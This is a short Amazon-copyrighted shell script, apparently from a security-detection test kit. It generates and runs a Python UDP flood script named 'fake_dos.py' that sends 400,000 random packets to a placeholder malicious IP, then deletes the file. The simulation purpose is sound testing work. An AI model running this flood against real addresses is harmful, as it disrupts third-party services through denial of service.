#Copyright 2024 Amazon.com, Inc. or its affiliates. All Rights Reserved.
#  
#  Licensed under the Apache License, Version 2.0 (the "License").
#  You may not use this file except in compliance with the License.
#  A copy of the License is located at
#  
#      http://www.apache.org/licenses/LICENSE-2.0
#  
#  or in the "license" file accompanying this file. This file is distributed 
#  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either 
#  express or implied. See the License for the specific language governing 
#  permissions and limitations under the License.

echo "import socket
import random
import string

dest_ip = '$MALICIOUS_IP'
dest_port = $PORT
payload = ''.join(random.choice(string.ascii_lowercase) for _ in range(64)).encode()


for i in range(400000):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('',0))
    s.sendto(payload, (dest_ip, dest_port))
    s.close()

" > fake_dos.py

python3 fake_dos.py
rm fake_dos.py